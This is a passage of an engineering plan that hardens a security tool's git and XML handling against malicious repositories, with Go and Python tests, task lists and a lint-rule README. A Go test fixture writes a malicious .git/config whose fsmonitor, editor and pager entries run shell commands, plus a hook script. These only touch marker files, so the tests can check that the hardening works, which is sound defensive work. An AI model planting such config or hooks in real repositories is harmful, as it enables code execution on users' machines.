// a marker file. After running gitCmd against it, the marker must NOT exist.
func setupMaliciousRepo(t *testing.T) (repoPath, markerPath string) {
	t.Helper()
	repoPath = t.TempDir()
	markerPath = filepath.Join(t.TempDir(), "vulture_hook_executed_marker")

	// Initialize a real git repo so subsequent git commands succeed.
	cmd := exec.Command("git", "init", "--quiet", repoPath)
	if err := cmd.Run(); err != nil {
		t.Fatal(err)
	}
	cfg := filepath.Join(repoPath, ".git", "config")
	cfgContent := `[core]
	fsmonitor = "/bin/sh -c 'touch ` + markerPath + `_fsmonitor'"
	editor = "/bin/sh -c 'touch ` + markerPath + `_editor'"
	pager = "/bin/sh -c 'touch ` + markerPath + `_pager'"
[user]
	email = test@example.com
	name = Test
`
	if err := os.WriteFile(cfg, []byte(cfgContent), 0o644); err != nil {
		t.Fatal(err)
	}
	hooksDir := filepath.Join(repoPath, ".git", "hooks")
	hookFile := filepath.Join(hooksDir, "post-checkout")
	hookContent := "#!/bin/sh\ntouch " + markerPath + "_hook\n"
	if err := os.WriteFile(hookFile, []byte(hookContent), 0o755); err != nil {
		t.Fatal(err)
	}

	// Make at least one commit so HEAD is valid for git operations.
	dummyFile := filepath.Join(repoPath, "README.md")
	if err := os.WriteFile(dummyFile, []byte("test"), 0o644); err != nil {
		t.Fatal(err)
	}
	for _, args := range [][]string{
		{"add", "."},
		{"-c", "user.email=t@t.t", "-c", "user.name=t", "commit", "--quiet", "-m", "init"},
	} {
		c := exec.Command("git", append([]string{"-C", repoPath}, args...)...)
		if out, err := c.CombinedOutput(); err != nil {
			t.Fatalf("setup git %v: %v: %s", args, err, out)
		}
	}
	return repoPath, markerPath
}

func TestGitCmd_DoesNotTriggerFsmonitor(t *testing.T) {
	repo, marker := setupMaliciousRepo(t)
	// gitCmd runs `git -c <hardening> -C <repo> rev-parse HEAD`.
	out := gitCmd(repo, "rev-parse", "HEAD")
	if out == "" {
		t.Fatal("gitCmd returned empty — git command failed")
	}
	for _, suffix := range []string{"_fsmonitor", "_editor", "_pager", "_hook"} {
		if _, err := os.Stat(marker + suffix); err == nil {
			t.Errorf("FATAL: malicious config triggered: %s", marker+suffix)
		}
	}
}

func TestGitCmd_HardeningOverridesRepoConfig(t *testing.T) {
	repo, _ := setupMaliciousRepo(t)
	// Pollute repo config with a -c override that should still be neutralized
	// by the hardening prefix (since hardening flags apply globally and
	// .git/config is the lowest precedence after them).
	out := gitCmd(repo, "config", "--get", "core.fsmonitor")
	// `core.fsmonitor=` (empty) should be the effective value.
	if out != "" {
		t.Errorf("expected core.fsmonitor empty, got: %q", out)
	}
}

func TestIsGitRepo_DoesNotTriggerHooks(t *testing.T) {
	repo, marker := setupMaliciousRepo(t)
	if !isGitRepo(repo) {
		t.Fatal("isGitRepo returned false on a real repo")
	}
	for _, suffix := range []string{"_fsmonitor", "_editor", "_pager", "_hook"} {
		if _, err := os.Stat(marker + suffix); err == nil {
			t.Errorf("FATAL: isGitRepo triggered: %s", marker+suffix)
		}
	}
}

func TestClone_AppliesHardeningToCommandLine(t *testing.T) {
	// We can't easily intercept exec.CommandContext without restructuring.
	// Instead, run a clone against a known invalid URL and verify the error
	// does NOT contain symptoms of a hardening flag being missing (e.g.,
	// the error doesn't mention recursive submodules failing on a malicious
	// URL we'd otherwise reach).
	//
	// Stronger test: shadow `git` with a wrapper that records args.
	t.Skip("flag-presence is covered by TestGitHardeningArgs_*; e2e clone " +
		"against a malicious repo requires hosting infrastructure")
}

func TestClone_RegressionAgainstRealRepo(t *testing.T) {
	if testing.Short() {
		t.Skip("network required")
	}
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	dest := t.TempDir()
	err := Clone(ctx, "https://github.com/octocat/Hello-World.git", dest, 1, nil)
	if err != nil {
		t.Fatalf("regression: hardened clone of known-good URL failed: %v", err)
	}
	// Confirm clone landed.
	if _, err := os.Stat(filepath.Join(dest, ".git")); err != nil {
		t.Fatalf("clone did not produce .git: %v", err)
	}
}
```

> **Note**: `TestClone_AppliesHardeningToCommandLine` is currently a stub (skipped). It can be promoted later by introducing a thin wrapper around `exec.CommandContext` that captures args; not in scope for this PR. The existing flag-presence tests (`TestGitHardeningArgs_*`, `TestGitCloneArgs_*`) cover the same property structurally.

### 2.5.3 — Python flag-presence + build_git_command tests in `agents/shared/tests/unit/safe_input/test_git.py`

NEW file. Lives under `safe_input/` because the helpers under test live in `safe_input/git.py`.

```python
"""Test corpus for shared.safe_input.git — Python git hardening helpers.

Validates GIT_HARDENING_ARGS / GIT_CLONE_ARGS contents AND build_git_command()
shape. Mirrors the Go-side TestGitHardeningArgs_* tests in pkg/gitutil/.
"""
import subprocess
from shared.safe_input.git import (
    GIT_HARDENING_ARGS,
    GIT_CLONE_ARGS,
    build_git_command,
)


def test_git_hardening_args_contains_required_flags():
    """GIT_HARDENING_ARGS MUST mirror backend/pkg/gitutil/hardening.go::gitHardeningArgs."""
    joined = " ".join(GIT_HARDENING_ARGS)
    required = [
        "core.fsmonitor=",
        "core.hooksPath=/dev/null",
        "core.editor=true",
        "core.pager=cat",
        "core.sshCommand=ssh",
        "safe.directory=*",
    ]
    for substr in required:
        assert substr in joined, f"missing {substr!r} from GIT_HARDENING_ARGS"


def test_git_hardening_args_formatted_as_config_pairs():
    """Every '-c' MUST be followed by a key=value string."""
    for i in range(0, len(GIT_HARDENING_ARGS), 2):
        assert GIT_HARDENING_ARGS[i] == "-c", \
            f"position {i}: expected '-c', got {GIT_HARDENING_ARGS[i]!r}"
        assert "=" in GIT_HARDENING_ARGS[i + 1], \
            f"position {i+1}: expected key=value, got {GIT_HARDENING_ARGS[i+1]!r}"


def test_git_clone_args_contains_cve_2024_32002_mitigations():
    """GIT_CLONE_ARGS MUST include all CVE-2024-32002 mitigations + protocol limits."""
    joined = " ".join(GIT_CLONE_ARGS)
    required = [
        "core.protectHFS=true",
        "core.protectNTFS=true",
        "core.symlinks=false",
        "protocol.allow=user",
        "protocol.file.allow=never",
        "protocol.ext.allow=never",
        "submodule.recurse=false",
    ]
    for substr in required:
        assert substr in joined, f"missing {substr!r} from GIT_CLONE_ARGS"


def test_build_git_command_basic_shape():
    """build_git_command produces: git, <hardening>, -C <path>, <args>."""
    cmd = build_git_command("/path/to/repo", "log", "--format=%H")
    assert cmd[0] == "git"
    minus_c_idx_first = cmd.index("-c")
    minus_C_idx = cmd.index("-C")
    assert minus_c_idx_first < minus_C_idx, "-c hardening must precede -C"
    last_minus_c_idx = max(i for i, v in enumerate(cmd) if v == "-c")
    assert minus_C_idx > last_minus_c_idx, "-C must come after all -c flags"
    assert cmd[-2:] == ["log", "--format=%H"], f"args appended last: {cmd}"


def test_build_git_command_clone_includes_clone_args():
    """When clone=True, GIT_CLONE_ARGS are also included."""
    cmd = build_git_command("", "clone", "https://example.com/repo.git", "/dst", clone=True)
    joined = " ".join(cmd)
    assert "core.protectHFS=true" in joined
    assert "core.symlinks=false" in joined
    assert "protocol.file.allow=never" in joined
    # No -C when repo_path is empty (clone uses positional dst arg instead)
    assert "-C" not in cmd or cmd.index("-C") > cmd.index("clone"), \
        "clone must not pass -C before subcommand"


def test_git_log_calls_use_build_git_command(tmp_path, monkeypatch):
    """git_log MUST call subprocess.run with the output of build_git_command."""
    captured = {}

    def fake_run(cmd, **kwargs):
        captured["cmd"] = cmd
        return subprocess.CompletedProcess(args=cmd, returncode=0, stdout="", stderr="")

    monkeypatch.setattr(subprocess, "run", fake_run)
    (tmp_path / ".git").mkdir()
    from shared.tools.git_history import git_log
    git_log(str(tmp_path))

    cmd = captured["cmd"]
    assert cmd[0] == "git"
    # Hardening flags present (verifies build_git_command was used)
    joined = " ".join(cmd)
    assert "core.fsmonitor=" in joined
    assert "core.hooksPath=/dev/null" in joined
    # -C points to the test path
    assert "-C" in cmd
    assert str(tmp_path) in cmd
```

### Tasks

- [ ] **2.5.t1** Create `backend/pkg/gitutil/hardening_test.go` with all 5 flag-presence tests above. Verbatim.
- [ ] **2.5.t2** Create `backend/pkg/gitutil/clone_security_test.go` with the 4 hook-blocking tests (real-repo regression skipped if network unavailable).
- [ ] **2.5.t3** Create `agents/shared/tests/unit/safe_input/test_git.py` with the 6 Python tests above (the `safe_input/` test directory already created in 1.4.t1).
- [ ] **2.5.t4** Run `cd backend && go test ./pkg/gitutil/ -count=1 -v`. **All must pass.**
- [ ] **2.5.t5** Run `python3 -m pytest agents/shared/tests/unit/safe_input/test_git.py -v`. All must pass.
- [ ] **2.5.t6** TDD verification: temporarily revert one hardening flag (e.g., remove `core.hooksPath=/dev/null` from `gitHardeningArgs`) and confirm `TestGitCmd_DoesNotTriggerFsmonitor` now FAILS (proves test calibration). Restore.

## 2.6 — CI lint (covered by unified §1.5 rule)

Phase 2's Go and Python git-invocation checks are part of the **single unified lint rule** introduced in §1.5 (`lint-no-direct-unsafe-input`). When Phase 2 lands, the same rule covers it without changes — the Go-side and Python-side git checks are sections 5 and 6 of the rule body. **No new Make target is added in Phase 2.**

### Tasks

- [ ] **2.6.t1** Verify the existing §1.5 lint rule already includes the Go `exec.Command(...)` git check (section 6) and the Python `subprocess.run(["git", ...])` git check (section 5). If only Phase 2 is shipping (Phase 1 already landed), no Makefile change is needed.
- [ ] **2.6.t2** Run `make lint-no-direct-unsafe-input` after Phase 2 lands. Must succeed (zero violations across XML + git + future sections).
- [ ] **2.6.t3** **Negative test (Phase 2 specific)**: temporarily change one git invocation in `clone.go` to remove `gitHardeningArgs()`; verify lint catches it; restore.

## 2.7 — Phase 2 acceptance criteria

- [ ] `backend/pkg/gitutil/hardening.go` exists with `gitHardeningArgs()` and `gitCloneArgs()` functions.
- [ ] `agents/shared/shared/safe_input/git.py` exists with `GIT_HARDENING_ARGS`, `GIT_CLONE_ARGS`, and `build_git_command()`.
- [ ] `agents/shared/shared/safe_input/__init__.py` re-exports the three git helpers alongside `safe_xml_parse`.
- [ ] `Clone` in `clone.go` prepends `gitHardeningArgs()` + `gitCloneArgs()` before `"clone"`.
- [ ] `isGitRepo` and `gitCmd` in `info.go` prepend `gitHardeningArgs()` before `-C`.
- [ ] `git_log` in `git_history.py` builds its command via `build_git_command()`; no local `_GIT_HARDENING_ARGS` constant remains in `git_history.py`.
- [ ] All 5 flag-presence tests in `hardening_test.go` pass.
- [ ] All 3+ hook-blocking tests in `clone_security_test.go` pass (network-dependent test skipped if offline).
- [ ] All 6 Python tests in `agents/shared/tests/unit/safe_input/test_git.py` pass.
- [ ] Existing `clone_test.go` and `info_test.go` regression tests pass.
- [ ] `make lint-no-direct-unsafe-input` passes (Go + Python git sections green; no separate `lint-git-hardening` target).
- [ ] TDD verification: removing one hardening flag causes a clearly-named test to fail.

---

# Cross-cutting concerns

## CC.1 — TDD discipline (CLAUDE.md mandatory)

Per `CLAUDE.md §Development Workflow (MANDATORY)`:

- **Write E2E tests FIRST**: every test file in §1.4, §1.5 (lint), §2.5, §2.6 (lint) must be authored before the corresponding implementation change. Each test must be **red** before the fix lands.
- **One change at a time**: each task in this plan is a single commit. Commit message format: `fix(scan): <task ID> <one-line summary>` for fixes; `test(scan): <task ID> <samples>` for tests.
- **Re-run full E2E after each commit**: `make test` (Go + Python). No commit lands with a regression.

## CC.2 — Performance budget

- defusedxml's parser is a thin wrapper around `xml.etree.ElementTree.fromstring` with pre-parse rejection of dangerous constructs. Performance overhead: typically < 5%.
- Git hardening flags add ~6 entries to the args list per call. Time overhead: << 1 ms (no extra process spawn).
- No measurable user-visible latency regression expected. CI must pass without budget changes.

## CC.3 — Backwards compatibility

- **Default-on**: defusedxml replacement is active for ALL discover-phase XML parsing immediately. Users who previously relied on XXE behavior (none should — XXE is a vuln) will see those features fail. None observed in current code.
- **Git hardening default-on**: every git invocation receives the prefix. No opt-out (intentional).
- API contracts unchanged: `safe_xml_parse` still returns `Element | None`; `git_log` still returns `list[dict]`; `Clone` still returns `error`.

## CC.4 — Threat model context

This feature closes specific known issues. It does NOT:
- Solve broader untrusted-content handling (deferred — separate feature).
- Add an `UntrustedBlob` wrapper.
- Address LLM injection (separate feature).
- Address SSH host-key verification (#4 — separate design).
- Address token-in-URL (#5 — separate refactor).

Document this scope explicitly in the PR description so reviewers don't expect the broader changes.

## CC.5 — Rollback

See `0038_rollback_plan.md`. High-level:

- Phase 1: revert the two file edits + remove defusedxml dep. ~5 minutes.
- Phase 2: revert the four file edits + remove `hardening.go`. ~5 minutes.

Both phases are pure revert; no data migration; no compose changes.

## CC.6 — Test-suite expansion convention

- Adding new XXE attack samples to `test_xml_xxe_protection.py` is encouraged. Each should follow the docstring pattern of describing what is being attacked, why defusedxml blocks it, and what would happen without protection.
- Removing existing samples requires explicit approval and a documented threat-model justification in this plan (§ "Out of Scope" must explain why).
- Same for git hardening samples.

---

# Open questions / decisions before kickoff

1. **Default Python (`make` vs `pytest`) for runner**: existing project uses `python3 -m pytest`. Confirm same in CI. (Likely yes — match `agents/discover/pyproject.toml` `dev` extras.)

2. **`safe.directory=*` security implication**: bypasses git's ownership check. We are intentionally bypassing it because we own the cloned dir as the same user that runs git. If Vulture ever runs git as a different user against a directory owned by another, this would defeat the protection. Accept this trade-off; document.

3. **`core.protectHFS=true` vs `core.protectHFS=core.protectHFS = true`**: git accepts `key=true` and `key = true`; our format is `key=true` (no spaces). Tested in `TestGitHardeningArgs_FormatsAsConfigPairs`.

4. **Network-dependent test (`TestClone_RegressionAgainstRealRepo`)**: gated on `testing.Short()`. Alternative: bundle a tiny offline fixture repo. Decision: keep network-gated; CI runs full mode.

5. **Symlink rejection (`core.symlinks=false`)**: a clone target containing a symlink-to-binary may have legitimate purposes (e.g., `node_modules/.bin/`). With `core.symlinks=false`, git records the symlink as a regular file containing the link target text. Discover/scan agents likely don't care; verify this doesn't break the source-walking pipeline. If it does, revisit.

---

## Summary

Feature 0038 closes 2 HIGH XML entity-injection vulnerabilities and 3 HIGH/MEDIUM git hardening gaps with two independent PRs that together establish a reusable `safe_input/` boundary library:

- **Phase 1**: create `agents/shared/shared/safe_input/` package with `xml.py` (defusedxml-backed `safe_xml_parse`), `__init__.py`, and `README.md`. Discover plugins import from there. defusedxml dep added to `agents/shared/pyproject.toml` (transitive to all agents). 14 attack + 5 benign + 3 sitemap integration tests. Single unified `lint-no-direct-unsafe-input` Make target.
- **Phase 2**: add `safe_input/git.py` (Python-side `GIT_HARDENING_ARGS` + `build_git_command`) and `pkg/gitutil/hardening.go` (Go-side mirror). Hardening applied to every git invocation across discover/scan/prove. 5 + 4 + 6 = 15 tests. Same unified lint rule from §1.5 catches Go and Python git regressions.

Total estimated effort: **2-3 days** for one developer including TDD discipline.

Each phase is independently mergeable, independently reversible, and gated by the unified CI lint to prevent re-introduction. **The `safe_input/` package is the foundation for future safe-input wrappers** (yaml, json, archive, base64, path, subprocess) — each future feature adds one module + one test file + zero lint changes (the lint already covers the dangerous-API category once defined).

---

## Appendix A — `safe_input/README.md` template

The README created in §1.1.t2 should follow this template (~60 lines):

```markdown
# safe_input — Vulture's untrusted-input boundary library

Every byte entering Vulture from outside the trust boundary — source code,
HTTP responses, git repos, memory entries, file paths, environment variables,
tool plugin output — originates from a potentially adversarial party.

This package provides safe-by-construction wrappers for parsing and processing
untrusted bytes. **Production code MUST use these wrappers instead of the
dangerous stdlib APIs they replace.**

## Available wrappers (as of feature 0038)

| Wrapper | Replaces | Threat model |
|---|---|---|
| `safe_xml_parse(content)` (`xml.py`) | `xml.etree.ElementTree.fromstring` | XXE / DOCTYPE entity smuggling / billion-laughs / external DTDs |
| `build_git_command(repo, *args)` (`git.py`) | manual `["git", "-C", repo, ...]` | `core.fsmonitor` / `core.hooksPath` RCE; CVE-2024-32002 case-folding |
| `GIT_HARDENING_ARGS` / `GIT_CLONE_ARGS` (`git.py`) | (constants) | as above |

## Usage

    from shared.safe_input import safe_xml_parse, build_git_command

    root = safe_xml_parse(response_body)
    if root is None:
        return  # rejected: empty / oversized / DOCTYPE / entity / malformed

    cmd = build_git_command(repo_path, "log", "--format=%H")
    subprocess.run(cmd, capture_output=True, text=True, timeout=10)

## How to add a new safe wrapper

1. Identify the dangerous stdlib API and its safe alternative.
2. Add a new module: `agents/shared/shared/safe_input/<name>.py`.
3. Implement the safe wrapper — drop-in shape matching the dangerous API
   so callers can swap by changing the import line only.
4. Re-export from `__init__.py`.
5. Add unit-test corpus at `agents/shared/tests/unit/safe_input/test_<name>.py`
   following the pattern from feature 0038 (red-baseline + benign + DiD samples,
   each test docstring labeled with `[EFFECTIVE TDD]` or `[DEFENSE IN DEPTH]`).
6. Extend `lint-no-direct-unsafe-input` in the Makefile to ban the dangerous
   API outside `safe_input/`.
7. Document the new wrapper in this README's table.

## CI enforcement

`make lint-no-direct-unsafe-input` runs in CI and rejects PRs that introduce
direct dangerous-API imports outside this package. Categories covered:

- `xml.etree` parsers
- `yaml.load` (must use `yaml.safe_load`)
- `pickle.load` / `pickle.loads` / `marshal.loads` on untrusted bytes
- `subprocess shell=True`, `os.system`, `os.popen`
- `subprocess.run(["git", ...])` not via `build_git_command`
- Go-side `exec.Command("git", ...)` not via `gitHardeningArgs`

Adding a new dangerous-API category? Extend the lint rule in `Makefile` and
note it in this README.
```
